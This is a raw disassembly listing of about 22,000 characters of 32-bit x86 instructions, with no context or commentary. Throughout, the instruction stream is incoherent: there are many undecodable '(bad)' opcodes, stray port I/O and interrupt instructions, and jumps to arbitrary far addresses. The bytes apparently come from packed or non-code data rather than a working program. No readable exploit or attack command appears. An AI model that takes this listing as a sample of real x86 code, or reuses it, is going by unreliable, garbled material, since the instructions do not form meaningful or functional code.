  41df9d:	popa   
  41df9e:	outs   dx,BYTE PTR ds:[esi]
  41df9f:	adc    al,BYTE PTR [esi]
  41dfa1:	push   edx
  41dfa2:	xor    ebx,DWORD PTR [eax+0x44]
  41dfa5:	retf   0x796e
  41dfa8:	in     eax,0xfc
  41dfaa:	aam    0x45
  41dfac:	cmp    al,0x8d
  41dfae:	inc    ecx
  41dfaf:	jbe    0x41df38
  41dfb1:	xchg   BYTE PTR [esi-0x27d15fdf],al
  41dfb7:	out    0xf3,eax
  41dfb9:	dec    esp
  41dfba:	mov    al,0x31
  41dfbc:	and    ebx,ebx
  41dfbe:	add    BYTE PTR [edi],dl
  41dfc0:	stos   BYTE PTR es:[edi],al
  41dfc1:	push   ebp
  41dfc2:	inc    DWORD PTR ds:0x7afeab73
  41dfc8:	or     dl,BYTE PTR [edx-0x53]
  41dfcb:	push   ds
  41dfcc:	test   DWORD PTR [ebp+0x6346ae3],0xf6e4e6f3
  41dfd6:	inc    esp
  41dfd7:	and    BYTE PTR [esi],cl
  41dfd9:	lods   eax,DWORD PTR ds:[esi]
  41dfda:	ss push ss
  41dfdc:	scas   eax,DWORD PTR es:[edi]
  41dfdd:	test   eax,0x8a9d04d7
  41dfe2:	pop    ebp
  41dfe3:	add    edx,DWORD PTR [edx+0x4143dc6c]
  41dfe9:	jae    0x41dfb4
  41dfeb:	cs scas eax,DWORD PTR es:[edi]
  41dfed:	push   esp
  41dfee:	or     BYTE PTR [edi+0x63d189c2],bl
  41dff4:	mov    esp,0x780c0d0f
  41dff9:	pop    ebp
  41dffa:	xchg   ebx,eax
  41dffb:	jl     0x41e07a
  41dffd:	icebp  
  41dffe:	add    al,0x52
  41e000:	jmp    0x89047988
  41e005:	(bad)  
  41e006:	jecxz  0x41e008
  41e008:	cs in  eax,dx
  41e00a:	loope  0x41e001
  41e00c:	leave  
  41e00d:	mov    ecx,0xb39a62ba
  41e012:	or     edi,esi
  41e014:	rcr    DWORD PTR [ebx-0x6315c027],0x2a
  41e01b:	std    
  41e01c:	jle    0x41e039
  41e01e:	mov    ecx,DWORD PTR [edx+eiz*2-0x10e5805]
  41e025:	sub    ch,0xab
  41e028:	jge    0x41e0a4
  41e02a:	adc    BYTE PTR [edi+0x1eb33983],al
  41e030:	push   ebp
  41e031:	jmp    FWORD PTR [edi+0x3e]
  41e034:	push   edi
  41e035:	or     al,0x91
  41e037:	sub    ah,BYTE PTR [esi+0x51]
  41e03a:	fisub  WORD PTR [ecx]
  41e03c:	inc    ecx
  41e03d:	sub    edx,DWORD PTR [ebx-0x44012871]
  41e043:	imul   esp,DWORD PTR [eax+0x44d5bb91],0xe3c5f486
  41e04d:	add    DWORD PTR [eax+0x4018aeaa],ebx
  41e053:	sbb    eax,0x1dcd3b2
  41e058:	aas    
  41e059:	and    ebp,ecx
  41e05b:	rcl    DWORD PTR [ebp+eax*1-0x4e],0x41
  41e060:	add    cl,BYTE PTR [esi-0x2120670b]
  41e066:	jp     0x41e0a4
  41e068:	xor    al,0x62
  41e06a:	into   
  41e06b:	mov    eax,0xef952067
  41e070:	gs cmp esp,0x53
  41e074:	dec    esp
  41e075:	sahf   
  41e076:	lahf   
  41e077:	adc    BYTE PTR [esp+edi*2],bh
  41e07a:	push   0x70e067d2
  41e07f:	fstp   st(5)
  41e081:	or     ah,BYTE PTR [ecx+0x6ca4d39e]
  41e087:	sbb    dl,BYTE PTR [ecx]
  41e089:	in     al,0x5c
  41e08b:	sub    al,0xdb
  41e08d:	inc    ebx
  41e08e:	fidivr WORD PTR [edi]
  41e090:	fldenv [ebx]
  41e092:	daa    
  41e093:	jns    0x41e03e
  41e095:	ss loopne 0x41e0c6
  41e098:	xor    BYTE PTR [ebx-0x1a4b86ec],ch
  41e09e:	and    esp,DWORD PTR [eax+0x17d4fc4a]
  41e0a4:	push   ebx
  41e0a5:	leave  
  41e0a6:	arpl   WORD PTR [edx],bp
  41e0a8:	sbb    eax,0x85baa90e
  41e0ad:	inc    esp
  41e0ae:	inc    esp
  41e0af:	mov    eax,ds:0xf584fc19
  41e0b4:	pop    ebp
  41e0b5:	imul   BYTE PTR [ebp+0x264ed7ae]
  41e0bb:	bound  edx,QWORD PTR [edx]
  41e0bd:	push   cs
  41e0be:	xchg   ebp,eax
  41e0bf:	xlat   BYTE PTR ds:[ebx]
  41e0c0:	aam    0x74
  41e0c2:	or     eax,0x68310a2f
  41e0c7:	mov    eax,0x4e87b186
  41e0cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0cd:	lahf   
  41e0ce:	and    eax,ebx
  41e0d0:	out    0x3f,al
  41e0d2:	mov    ebx,DWORD PTR [esi+0x7903e5fa]
  41e0d8:	push   ecx
  41e0d9:	or     ebx,DWORD PTR [ecx+eax*4-0x5d]
  41e0dd:	pop    edx
  41e0de:	ret    0xbd65
  41e0e1:	xchg   ebx,eax
  41e0e2:	aaa    
  41e0e3:	test   DWORD PTR [edx-0x2f],eax
  41e0e6:	pop    ebx
  41e0e7:	icebp  
  41e0e8:	add    esp,DWORD PTR [ecx]
  41e0ea:	ret    
  41e0eb:	sbb    al,0x25
  41e0ed:	jnp    0x41e12a
  41e0ef:	mov    cl,0x9
  41e0f1:	pushf  
  41e0f2:	sub    al,0x33
  41e0f4:	test   eax,0x5b972fd8
  41e0f9:	sar    DWORD PTR [esi+0xf],cl
  41e0fc:	aad    0xe4
  41e0fe:	scas   al,BYTE PTR es:[edi]
  41e0ff:	mov    dh,0x9
  41e101:	rcr    BYTE PTR [edx-0x18088754],cl
  41e107:	xchg   esp,eax
  41e108:	mov    bh,0x4f
  41e10a:	shr    DWORD PTR [eax+0x7a50ce27],cl
  41e110:	(bad)  
  41e111:	push   edi
  41e112:	mov    bl,0x7f
  41e114:	mov    ecx,0xf71859fe
  41e119:	mov    edi,0xf8060135
  41e11e:	in     eax,dx
  41e11f:	in     al,dx
  41e120:	mov    eax,0x43e92a4a
  41e125:	mov    dl,0xec
  41e127:	ret    
  41e128:	stos   DWORD PTR es:[edi],eax
  41e129:	add    BYTE PTR ds:0x3aa6b663,0x93
  41e130:	inc    esp
  41e131:	fld    TBYTE PTR [ecx-0x7c3ef8b7]
  41e137:	outs   dx,BYTE PTR ds:[esi]
  41e138:	cld    
  41e139:	xlat   BYTE PTR ds:[ebx]
  41e13a:	jmp    0x321a:0x83cd37dd
  41e141:	ds mov dh,0x44
  41e144:	dec    esi
  41e145:	(bad)  
  41e146:	sub    dl,BYTE PTR [eax-0x7d]
  41e149:	xchg   esi,eax
  41e14a:	mov    dh,0xba
  41e14c:	jo     0x41e152
  41e14e:	out    0x35,al
  41e150:	or     bh,ah
  41e152:	iret   
  41e153:	sbb    eax,0x5a8b5a05
  41e158:	or     ecx,ebp
  41e15a:	xlat   BYTE PTR ds:[ebx]
  41e15b:	mov    ds:0x9c6ba108,al
  41e160:	jae    0x41e172
  41e162:	and    al,0x7
  41e164:	pop    ss
  41e165:	(bad)  
  41e166:	xchg   esp,eax
  41e167:	fwait
  41e168:	aas    
  41e169:	mov    ch,0x9e
  41e16b:	popa   
  41e16c:	sbb    al,0xed
  41e16e:	lods   al,BYTE PTR ds:[esi]
  41e16f:	mov    bl,cl
  41e171:	add    BYTE PTR [eax-0x46f382d5],0x62
  41e178:	ins    DWORD PTR es:[edi],dx
  41e179:	shr    DWORD PTR [ecx-0x8c460aa],1
  41e17f:	jmp    0x41e17e
  41e181:	jge    0x41e17d
  41e183:	scas   al,BYTE PTR es:[edi]
  41e184:	ins    WORD PTR es:[edi],dx
  41e186:	jl     0x41e1ab
  41e188:	push   0xffffffd0
  41e18a:	push   ss
  41e18b:	sub    al,0x54
  41e18d:	(bad)  
  41e18e:	sti    
  41e18f:	rsqrtps xmm3,XMMWORD PTR [edi]
  41e192:	xor    edx,DWORD PTR [edi]
  41e194:	rcr    edx,0x1c
  41e197:	mov    al,0x4b
  41e199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e19a:	(bad)  
  41e19b:	mov    esi,0x26c8ea45
  41e1a0:	retf   
  41e1a1:	mov    ds:0x6e743bcc,eax
  41e1a6:	and    BYTE PTR [edi+0x3451a42f],ch
  41e1ac:	call   0xe9e7c29e
  41e1b1:	cmp    ebp,DWORD PTR [ebp-0x25]
  41e1b4:	cmp    ecx,esp
  41e1b6:	jp     0x41e1ab
  41e1b8:	mov    bh,0x99
  41e1ba:	push   esi
  41e1bb:	imul   ebx,DWORD PTR [edi+0x68],0x1860c67f
  41e1c2:	retf   
  41e1c3:	call   0x49bbd6cd
  41e1c8:	ins    DWORD PTR es:[edi],dx
  41e1c9:	out    0x97,eax
  41e1cb:	xlat   BYTE PTR ds:[ebx]
  41e1cc:	jae    0x41e1c4
  41e1ce:	mov    ebp,0xe71c9efd
  41e1d3:	sar    BYTE PTR [esi-0x5036aa1e],0x62
  41e1da:	int3   
  41e1db:	push   edx
  41e1dc:	mov    bl,0xb9
  41e1de:	aas    
  41e1df:	dec    eax
  41e1e0:	faddp  st(4),st
  41e1e2:	adc    eax,0x58f020b7
  41e1e7:	leave  
  41e1e8:	ins    BYTE PTR es:[edi],dx
  41e1e9:	dec    eax
  41e1ea:	push   ss
  41e1eb:	out    dx,al
  41e1ec:	mov    WORD PTR [ebx],ss
  41e1ee:	push   ecx
  41e1ef:	mov    BYTE PTR [edi-0x5],ah
  41e1f2:	jnp    0x41e1e8
  41e1f4:	out    dx,eax
  41e1f5:	or     ecx,edx
  41e1f7:	adc    ah,BYTE PTR [ecx-0x51a244f1]
  41e1fd:	data16 lahf 
  41e1ff:	adc    DWORD PTR [ecx-0x7],ecx
  41e202:	cmp    eax,0xaf95e896
  41e207:	cwde   
  41e208:	pop    ebp
  41e209:	inc    edi
  41e20a:	inc    ecx
  41e20b:	sbb    dh,BYTE PTR [ebp+0x7653b6e5]
  41e211:	cwde   
  41e212:	sahf   
  41e213:	(bad)  
  41e214:	pop    ecx
  41e215:	add    eax,0x596004dd
  41e21a:	cmp    edx,DWORD PTR [esi]
  41e21c:	cmp    BYTE PTR [eax+0x7a],0x5b
  41e220:	add    edx,DWORD PTR [edx+0x2f923f52]
  41e226:	push   cs
  41e227:	xchg   esp,eax
  41e228:	xor    DWORD PTR [ebx-0x478d3f36],ecx
  41e22e:	(bad)  
  41e230:	mov    WORD PTR [ebp+0x6e287d7e],es
  41e236:	mov    edx,0xade1d87d
  41e23b:	sbb    al,0xd7
  41e23d:	retf   0x513
  41e240:	je     0x41e215
  41e242:	adc    eax,0x6ec95012
  41e247:	fiadd  DWORD PTR [eax]
  41e249:	aaa    
  41e24a:	mov    al,ds:0xe3e1d9c
  41e24f:	mov    ebx,0x318ffc80
  41e254:	push   cs
  41e255:	or     eax,0x33b71456
  41e25a:	out    dx,al
  41e25b:	int    0x9c
  41e25d:	jmp    0x7757:0x32530422
  41e264:	mov    WORD PTR [edx],gs
  41e266:	arpl   WORD PTR [edi],cx
  41e268:	mov    ah,0x70
  41e26a:	outs   dx,BYTE PTR ds:[esi]
  41e26b:	lahf   
  41e26c:	pop    eax
  41e26d:	dec    esp
  41e26e:	stc    
  41e26f:	inc    edx
  41e270:	mov    al,ds:0xe81f8a26
  41e275:	test   al,0x4b
  41e277:	rcr    ah,0x3e
  41e27a:	mov    dl,0x5c
  41e27c:	mov    bl,0xf6
  41e27e:	inc    ebp
  41e27f:	or     BYTE PTR [ebp-0xc961529],al
  41e285:	hlt    
  41e286:	popf   
  41e287:	inc    edi
  41e288:	mov    ebp,0x53aa1ea1
  41e28d:	add    BYTE PTR ds:0x672b522d,bl
  41e293:	add    ah,BYTE PTR [ecx+esi*1-0x3b5469f3]
  41e29a:	mov    bh,0x36
  41e29c:	cli    
  41e29d:	pop    ebx
  41e29e:	fistp  QWORD PTR [esi]
  41e2a0:	add    eax,0xc35c99e3
  41e2a5:	dec    esi
  41e2a6:	sbb    dl,BYTE PTR [edx]
  41e2a8:	rcr    DWORD PTR [esi-0x53b7a925],0x27
  41e2af:	dec    edx
  41e2b0:	dec    esi
  41e2b1:	xor    al,BYTE PTR [ebx+0x47]
  41e2b4:	add    BYTE PTR [ecx],bh
  41e2b6:	mov    BYTE PTR [esi+0x37],bl
  41e2b9:	mov    ah,cl
  41e2bb:	push   edi
  41e2bc:	mov    edx,0xcfa63ec3
  41e2c1:	iret   
  41e2c2:	jmp    0x7becfdc1
  41e2c7:	mov    ds,WORD PTR [edi]
  41e2c9:	pop    edx
  41e2ca:	loopne 0x41e305
  41e2cc:	jl     0x41e2f7
  41e2ce:	fincstp 
  41e2d0:	or     eax,edi
  41e2d2:	out    dx,eax
  41e2d3:	cmp    bl,BYTE PTR [edx+0x20]
  41e2d6:	xor    BYTE PTR [ebx],ah
  41e2d8:	out    0xa9,eax
  41e2da:	push   esp
  41e2db:	and    BYTE PTR [eax+0x69],bh
  41e2de:	jmp    0x41e336
  41e2e0:	mov    al,ds:0x7ab91b30
  41e2e5:	shl    DWORD PTR [edi+0x3f],0xd1
  41e2e9:	mov    ds:0x239d36c0,eax
  41e2ee:	pop    es
  41e2ef:	push   cs
  41e2f0:	nop
  41e2f1:	add    dl,bl
  41e2f3:	xor    DWORD PTR [ebp-0x2b],esi
  41e2f6:	clc    
  41e2f7:	pop    eax
  41e2f8:	jp     0x41e27d
  41e2fa:	mov    ah,0x78
  41e2fc:	mov    ds:0xde1f1d55,eax
  41e301:	pop    ecx
  41e302:	mov    ebx,0xc6f2a722
  41e307:	lds    esi,FWORD PTR ds:0xb8807864
  41e30d:	in     eax,dx
  41e30e:	cmp    edi,DWORD PTR [ecx]
  41e310:	mov    ebx,0x3fc69e39
  41e315:	stos   DWORD PTR es:[edi],eax
  41e316:	rol    DWORD PTR [edi-0x14],cl
  41e319:	mov    esp,DWORD PTR [ebx]
  41e31b:	ja     0x41e37d
  41e31d:	add    esi,DWORD PTR [ebx+0x76de55f5]
  41e323:	dec    edx
  41e324:	push   ds
  41e325:	push   esi
  41e326:	xor    BYTE PTR [ecx+ebp*8],bl
  41e329:	or     DWORD PTR [ecx+0x2c993ddc],ebx
  41e32f:	test   eax,0x16621f25
  41e334:	mov    ds:0xd726debf,eax
  41e339:	inc    edx
  41e33a:	xor    al,0x37
  41e33c:	adc    ebx,DWORD PTR ds:[ecx]
  41e33f:	cld    
  41e340:	and    eax,0x34fad136
  41e345:	jo     0x41e354
  41e347:	popa   
  41e348:	test   dh,dl
  41e34a:	enter  0x350b,0x89
  41e34e:	add    al,0x99
  41e350:	mov    esp,0xa8b0282c
  41e355:	sub    bl,BYTE PTR [edx]
  41e357:	inc    esi
  41e358:	inc    edi
  41e359:	inc    esi
  41e35a:	outs   dx,DWORD PTR ds:[esi]
  41e35b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e35c:	outs   dx,BYTE PTR ds:[esi]
  41e35d:	bound  edx,QWORD PTR [ecx-0x6b73e15b]
  41e363:	fdivr  st,st(7)
  41e365:	lds    ebp,FWORD PTR [ebp+0x93a5cb8]
  41e36b:	cmp    BYTE PTR [esi+edx*1+0xd],dh
  41e36f:	std    
  41e370:	daa    
  41e371:	cmp    esp,ebx
  41e373:	pop    ebp
  41e374:	inc    edx
  41e375:	ret    
  41e376:	xor    eax,0xb2efa998
  41e37b:	mov    DWORD PTR [ebx-0x1bf748ab],esp
  41e381:	dec    ecx
  41e382:	rol    DWORD PTR [edi+0x3e7fe62a],1
  41e388:	dec    esi
  41e389:	retf   0x986a
  41e38c:	jmp    0xa93673b0
  41e391:	fsub   st(7),st
  41e393:	lods   eax,DWORD PTR ds:[esi]
  41e394:	push   ds
  41e395:	leave  
  41e396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e397:	(bad)  
  41e398:	int    0xbe
  41e39a:	mov    bh,0xfe
  41e39c:	repz hlt 
  41e39e:	adc    eax,DWORD PTR [ecx-0x6bd6e13e]
  41e3a4:	xchg   WORD PTR [edi+0x660a25b0],dx
  41e3ab:	ret    0x6903
  41e3ae:	in     al,0x5a
  41e3b0:	jmp    0x41e381
  41e3b2:	sbb    bl,BYTE PTR [ebp-0x48]
  41e3b5:	sahf   
  41e3b6:	gs je  0x41e3f2
  41e3b9:	mov    ebp,0x6fce941a
  41e3be:	jnp    0x41e3f7
  41e3c0:	sub    al,0xbe
  41e3c2:	(bad)  [ecx-0x22]
  41e3c5:	mov    ch,0xd3
  41e3c7:	sbb    BYTE PTR [edi],0x98
  41e3ca:	add    ebp,DWORD PTR [eax+0x773cbfc0]
  41e3d0:	imul   BYTE PTR [edi-0x22]
  41e3d3:	bound  ebx,QWORD PTR [edx+0x5e]
  41e3d6:	cwde   
  41e3d7:	mov    cl,0x63
  41e3d9:	sub    DWORD PTR [edi+0x27b8d23a],0xfffffff1
  41e3e0:	mov    edx,0xb63fc5eb
  41e3e5:	stos   BYTE PTR es:[edi],al
  41e3e6:	jnp    0x41e3ae
  41e3e8:	mov    ch,0x56
  41e3ea:	jmp    0x41e3d9
  41e3ec:	pop    esi
  41e3ed:	or     BYTE PTR [ecx],bh
  41e3ef:	les    edi,FWORD PTR [esi+0x53]
  41e3f2:	xchg   ebp,eax
  41e3f3:	sti    
  41e3f4:	pop    ss
  41e3f5:	in     eax,dx
  41e3f6:	dec    esp
  41e3f7:	loopne 0x41e385
  41e3f9:	fiadd  WORD PTR [ecx-0x6d]
  41e3fc:	loopne 0x41e3dc
  41e3fe:	jns    0x41e388
  41e400:	sub    DWORD PTR [ebp-0x57597f0c],ecx
  41e406:	pushf  
  41e407:	adc    al,0xce
  41e409:	xchg   esp,eax
  41e40a:	mov    ds:0x3cdf3b0e,eax
  41e40f:	mov    ah,0x77
  41e411:	xor    al,0x41
  41e413:	jmp    0x11c40d44
  41e418:	cmp    bl,BYTE PTR [esi]
  41e41a:	mov    ds:0x85f329a2,eax
  41e41f:	sub    BYTE PTR [esi+0x54],cl
  41e422:	xchg   ecx,eax
  41e423:	add    eax,0xffaad3db
  41e428:	mov    eax,0x8d221810
  41e42d:	repnz mov al,ds:0x6326b0e
  41e433:	adc    DWORD PTR [esi+0x75],ebx
  41e436:	add    cl,cl
  41e438:	pushf  
  41e439:	xor    esp,DWORD PTR [esi-0x738cbd06]
  41e43f:	int3   
  41e440:	cmp    DWORD PTR [edx+0x312059cb],eax
  41e446:	xchg   esp,esp
  41e448:	xlat   BYTE PTR ds:[ebx]
  41e449:	popf   
  41e44a:	push   0xe566817
  41e44f:	loope  0x41e3fd
  41e451:	arpl   WORD PTR [ebx-0x23],cx
  41e454:	jl     0x41e40b
  41e456:	xchg   esp,eax
  41e457:	mov    ds:0x6316c002,al
  41e45c:	mov    ?,WORD PTR [ebp+0x7a86dc43]
  41e462:	arpl   WORD PTR [esi-0x72],bx
  41e465:	xor    DWORD PTR [edi+eax*8],0x6fba9f26
  41e46c:	xor    dh,BYTE PTR [esp+ebx*8-0x7b]
  41e470:	or     bl,dh
  41e472:	gs inc esi
  41e474:	or     DWORD PTR [ebx],0xffffffbf
  41e477:	xor    bh,BYTE PTR [eax+0x1dac9b1e]
  41e47d:	mov    ebp,DWORD PTR [eax+0x67]
  41e480:	adc    DWORD PTR [ecx+0x6e250802],esi
  41e486:	push   es
  41e487:	loope  0x41e417
  41e489:	add    BYTE PTR [eax-0x78],ch
  41e48c:	lock adc ebp,esp
  41e48f:	lds    ecx,FWORD PTR [edi+0x45bac60c]
  41e495:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e496:	mov    dh,0xb
  41e498:	adc    bh,BYTE PTR [edi]
  41e49a:	and    eax,0x6ca2e147
  41e49f:	add    eax,0x33829231
  41e4a4:	push   edi
  41e4a5:	inc    eax
  41e4a6:	js     0x41e4fc
  41e4a8:	mov    edx,0x506c17d9
  41e4ad:	push   esi
  41e4ae:	pushf  
  41e4af:	lods   al,BYTE PTR ds:[esi]
  41e4b0:	pop    esp
  41e4b1:	sub    DWORD PTR [esi+0x19],edi
  41e4b4:	cmp    eax,0x15f4f347
  41e4b9:	mov    ecx,edx
  41e4bb:	pop    edx
  41e4bc:	aad    0x1f
  41e4be:	sbb    esp,DWORD PTR gs:[edi+edx*4+0x3e93bc28]
  41e4c6:	xor    eax,0x22382065
  41e4cb:	add    al,0x9d
  41e4cd:	jno    0x41e4cd
  41e4cf:	add    BYTE PTR [ecx-0x5e],ah
  41e4d2:	scas   al,BYTE PTR es:[edi]
  41e4d3:	adc    DWORD PTR [ecx],edi
  41e4d5:	stos   BYTE PTR es:[edi],al
  41e4d6:	mov    DWORD PTR [edx],ebx
  41e4d8:	push   edx
  41e4d9:	(bad)  
  41e4da:	loope  0x41e4c0
  41e4dc:	int    0xff
  41e4de:	jbe    0x41e4ce
  41e4e0:	lahf   
  41e4e1:	iret   
  41e4e2:	sub    BYTE PTR [esi+0x45aaa263],cl
  41e4e8:	push   ss
  41e4e9:	mov    bh,0x91
  41e4eb:	xchg   ebx,eax
  41e4ec:	stos   DWORD PTR es:[edi],eax
  41e4ed:	cmp    esi,DWORD PTR [eax+0xe]
  41e4f0:	push   0xffffffe1
  41e4f2:	inc    ecx
  41e4f3:	fs add esi,edx
  41e4f6:	cmp    DWORD PTR [esi+0x23f59936],eax
  41e4fc:	dec    esp
  41e4fd:	ret    
  41e4fe:	cmp    al,0xac
  41e500:	push   ebp
  41e501:	pmulhw mm0,QWORD PTR [ebx-0x38]
  41e505:	mov    ecx,0xaf10d902
  41e50a:	nop
  41e50b:	mov    dl,0x17
  41e50d:	ret    0xdc9b
  41e510:	xor    eax,0x1d64f32a
  41e515:	stos   BYTE PTR es:[edi],al
  41e516:	iret   
  41e517:	sti    
  41e518:	dec    ebx
  41e519:	adc    cl,bh
  41e51b:	out    dx,eax
  41e51c:	dec    eax
  41e51d:	xor    BYTE PTR [edi-0x54f0d59c],bl
  41e523:	mov    ecx,0x694833d8
  41e528:	sbb    eax,0x6c993ae9
  41e52d:	jp     0x41e51f
  41e52f:	adc    eax,0x1d35a4d
  41e534:	or     bl,BYTE PTR [ebp+0x5e]
  41e537:	cmp    ecx,edx
  41e539:	xor    BYTE PTR [ebp+0x78],cl
  41e53c:	scas   al,BYTE PTR es:[edi]
  41e53d:	lds    ebp,FWORD PTR [esi]
  41e53f:	sub    BYTE PTR ds:0x94c2dd6,dh
  41e545:	stos   DWORD PTR es:[edi],eax
  41e546:	retf   0x807b
  41e549:	popa   
  41e54a:	lock out dx,al
  41e54c:	jb     0x41e5a4
  41e54e:	pop    esi
  41e54f:	xchg   ebx,eax
  41e550:	std    
  41e551:	sub    al,ch
  41e553:	jae    0x41e5c5
  41e555:	sbb    DWORD PTR [eax-0x3eb6e36a],ecx
  41e55b:	pop    ebx
  41e55c:	or     DWORD PTR [ecx-0x43],ebx
  41e55f:	jae    0x41e552
  41e561:	sbb    eax,0xafae3172
  41e566:	lock or ecx,eax
  41e569:	inc    eax
  41e56a:	daa    
  41e56b:	test   eax,0xc1f5a2a0
  41e570:	test   DWORD PTR [eax+esi*1+0x2a],ebp
  41e574:	dec    ebx
  41e575:	shl    DWORD PTR [bx],0x28
  41e579:	scas   al,BYTE PTR es:[edi]
  41e57a:	js     0x41e58b
  41e57c:	push   es
  41e57d:	fbld   TBYTE PTR [eax-0xf]
  41e580:	xlat   BYTE PTR ds:[ebx]
  41e581:	sbb    al,0xcd
  41e583:	loope  0x41e5bb
  41e585:	in     eax,dx
  41e586:	out    0x39,al
  41e588:	shl    BYTE PTR [eax+0x44],0x8c
  41e58c:	adc    esi,eax
  41e58e:	sbb    BYTE PTR [ecx],dl
  41e590:	leave  
  41e591:	dec    ebx
  41e592:	add    DWORD PTR [esi],esi
  41e594:	pop    ecx
  41e595:	out    dx,eax
  41e596:	mov    eax,ds:0xc68eb45a
  41e59b:	push   ss
  41e59c:	xor    DWORD PTR ds:0xbfca26f5,0x2f
  41e5a3:	pop    eax
  41e5a4:	hlt    
  41e5a5:	cmp    DWORD PTR [ecx-0x31],ebp
  41e5a8:	adc    BYTE PTR [esi+edi*1+0x49],bh
  41e5ac:	test   al,0x27
  41e5ae:	xor    ch,BYTE PTR [ebx-0x57]
  41e5b1:	cmp    eax,0x82a1ce7c
  41e5b6:	jge    0x41e613
  41e5b8:	lds    ebp,FWORD PTR [ebx-0x2629c2dc]
  41e5be:	mov    eax,0x5c5796d3
  41e5c3:	xor    ebx,DWORD PTR [eax]
  41e5c5:	dec    edi
  41e5c6:	dec    ecx
  41e5c7:	arpl   WORD PTR ds:0x425c87d1,si
  41e5cd:	mov    ds:0x87acc09f,eax
  41e5d2:	push   esp
  41e5d3:	jbe    0x41e5e3
  41e5d5:	push   es
  41e5d6:	rcl    ah,cl
  41e5d8:	mov    DWORD PTR [edx-0x6ebcb9e9],eax
  41e5de:	add    bl,BYTE PTR [ebp+ebx*1+0x17]
  41e5e2:	fnsave [ebp-0x5b83b339]
  41e5e8:	xchg   ebx,eax
  41e5e9:	jge    0x41e5da
  41e5eb:	je     0x41e5f6
  41e5ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5ee:	(bad)
  41e5f1:	push   es
  41e5f2:	sub    eax,0x5498490c
  41e5f7:	xchg   esi,eax
  41e5f8:	scas   al,BYTE PTR es:[edi]
  41e5f9:	stos   BYTE PTR es:[edi],al
  41e5fa:	hlt    
  41e5fb:	mov    edx,0x774a5eed
  41e600:	and    al,0xb9
  41e602:	out    dx,al
  41e603:	nop
  41e604:	imul   edx,DWORD PTR [ecx],0x97e03b89
  41e60a:	clc    
  41e60b:	nop
  41e60c:	mov    esi,0xb760a0c6
  41e611:	adc    BYTE PTR [edi+0x64],al
  41e614:	add    BYTE PTR [ebp+0x7],bh
  41e617:	in     al,dx
  41e618:	mov    eax,0x7d56afbc
  41e61d:	jno    0x41e61d
  41e61f:	into   
  41e620:	adc    eax,0x1467f9d3
  41e625:	jno    0x41e5bc
  41e627:	and    DWORD PTR [edi-0x76],esi
  41e62a:	nop
  41e62b:	dec    ebp
  41e62c:	div    esi
  41e62e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e62f:	aas    
  41e630:	pop    es
  41e631:	sbb    BYTE PTR [ecx+0x63],al
  41e634:	fdiv   DWORD PTR [eax+0x8]
  41e637:	aaa    
  41e638:	cmp    BYTE PTR [edi+0x39],bl
  41e63b:	scas   eax,DWORD PTR es:[edi]
  41e63c:	ret    
  41e63d:	test   BYTE PTR [ebx+esi*4+0x6bf029c],cl
  41e644:	mov    esi,0x9dcb7d83
  41e649:	out    0x84,eax
  41e64b:	push   esi
  41e64c:	ja     0x41e6c3
  41e64e:	shr    DWORD PTR [ebx],0x23
  41e651:	adc    eax,0xf500f79f
  41e656:	jno    0x41e67d
  41e658:	push   ecx
  41e659:	xchg   edx,ecx
  41e65b:	ins    BYTE PTR es:[edi],dx
  41e65c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e65d:	lods   eax,DWORD PTR ds:[esi]
  41e65e:	xchg   ebp,eax
  41e65f:	inc    edx
  41e660:	in     al,0x29
  41e662:	sub    al,0x91
  41e664:	add    esi,ecx
  41e666:	pop    esp
  41e667:	inc    edi
  41e668:	pop    ebx
  41e669:	int    0x6d
  41e66b:	dec    esi
  41e66c:	add    ebx,DWORD PTR [ebx]
  41e66e:	adc    dl,bh
  41e670:	cmp    eax,0xd0115f32
  41e675:	cli    
  41e676:	hlt    
  41e677:	call   0x62b3:0x5d6cb997
  41e67e:	xor    BYTE PTR [ebp+eax*4-0x37],bl
  41e682:	inc    esi
  41e683:	sbb    eax,0x17aabfb3
  41e688:	rol    DWORD PTR [edx+0x2],0xb4
  41e68c:	push   es
  41e68d:	sbb    al,al
  41e68f:	sbb    BYTE PTR [ebx+0x50],bl
  41e692:	sahf   
  41e693:	ins    BYTE PTR es:[edi],dx
  41e694:	add    eax,0xaf4019e0
  41e699:	or     ecx,esp
  41e69b:	inc    eax
  41e69c:	mov    es,WORD PTR [ecx+0x3a]
  41e69f:	fistp  QWORD PTR [ebx+0x5e]
  41e6a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6a3:	inc    ebp
  41e6a4:	jne    0x41e6a4
  41e6a6:	retf   0x4b5f
  41e6a9:	aas    
  41e6aa:	sub    dl,BYTE PTR [edx]
  41e6ac:	or     DWORD PTR [edx],esi
  41e6ae:	cdq    
  41e6af:	or     eax,0x555b922b
  41e6b4:	cdq    
  41e6b5:	mov    bh,0xde
  41e6b7:	dec    edi
  41e6b8:	push   ebx
  41e6b9:	ins    BYTE PTR es:[edi],dx
  41e6ba:	adc    al,0x3d
  41e6bc:	fsubr  QWORD PTR [esi-0x3946a6bd]
  41e6c2:	or     ch,BYTE PTR [ebx+0x39]
  41e6c5:	push   0xffffffe9
  41e6c7:	stos   DWORD PTR es:[edi],eax
  41e6c8:	pop    ebp
  41e6c9:	mov    dl,0x5a
  41e6cb:	fcmovne st,st(4)
  41e6cd:	enter  0xad29,0xa7
  41e6d1:	xchg   ecx,eax
  41e6d2:	int3   
  41e6d3:	(bad)  
  41e6d4:	push   eax
  41e6d5:	es lahf 
  41e6d7:	jne    0x41e6c6
  41e6d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6da:	xor    dh,BYTE PTR [eax]
  41e6dc:	dec    ebp
  41e6dd:	fxch   st(3)
  41e6df:	push   esp
  41e6e0:	jp     0x41e67d
  41e6e2:	mov    ebp,0x8972f41a
  41e6e7:	or     edx,DWORD PTR [eax]
  41e6e9:	push   ecx
  41e6ea:	sahf   
  41e6eb:	(bad)  
  41e6ec:	in     eax,dx
  41e6ed:	mov    BYTE PTR [ecx-0x3d6922b3],ah
  41e6f3:	sbb    bh,BYTE PTR [ecx+0x16]
  41e6f6:	push   0x3dc1a2ad
